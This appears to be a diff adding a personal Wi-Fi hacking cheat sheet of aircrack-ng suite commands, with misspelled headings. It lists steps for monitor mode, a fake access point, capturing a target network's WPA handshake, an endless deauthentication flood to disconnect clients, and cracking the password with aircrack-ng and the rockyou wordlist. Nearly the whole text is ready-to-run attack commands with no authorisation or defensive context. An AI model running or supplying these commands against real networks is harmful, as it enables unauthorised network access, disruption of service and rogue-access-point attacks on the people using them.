@@ -1,0 +1,61 @@
+Tasting
+
+sudo airmon-ng check kill
+sudo iwconfig wlan0 mode monitor
+sudo aireplay-ng --test wlan0
+sudo airodump-ng --band a wlan0 [5ghz]
+sudo airodump-ng --band bg wlan0 [2.4 ghz]
+sudo airodump-ng wlan0 [all]
+
+fack AP
+sudo airbase-ng -a 00:01:02:03:04:05 --essid "Tarun Papa" -c 11 wlan0
+
+
+
+wifi hacking start
+
+sudo airmon-ng check kill
+sudo iwconfig wlan0 mode monitor    [sudo iwconfig wlan0 mode managed]
+sudo airmon-ng start wlan0
+
+
+sudo airmon-ng start {wlan0} [chane bssid and wifiname]
+sudo airodump-ng {wlan0}
+
+new tarminal
+sudo airodump-ng {wlan0mon} -d {AA:A9:15:07:DF:0C}
+sudo airodump-ng wlan0mon -d AA:A9:15:07:DF:0C
+
+new tarminal
+sudo airodump-ng -w hack1 -c {1} --bssid {AA:A9:15:07:DF:0C} {wlan0mon} [c mins channal id link ch]
+sudo airodump-ng -w hack1 -c 1 --bssid AA:A9:15:07:DF:0C wlan0mon
+
+new tarminal
+sudo aireplay-ng --deauth 0 -a {AA:A9:15:07:DF:0C} {wlan0mon}
+sudo aireplay-ng --deauth 0 -a AA:A9:15:07:DF:0C wlan0mon [chane bssid and wifiname]
+
+
+
+
+{ Chack  #not nesscerry
+ls
+wireshark hack1-01.cap  [change cap file]
+search eapol }
+
+
+Possword Crack
+aircrack-ng {hack1-01.cap} -w {/usr/share/wordlists/rockyou.txt}
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
+change cap file and wordlist Path
+
+
+
+
+
+name change
+sudo ip link set wlan0 name wlan0mon
+
+
+stop and Start moniter mode
+sudo airmon-ng stop wlan0
+sudo airmon-ng start wlan0
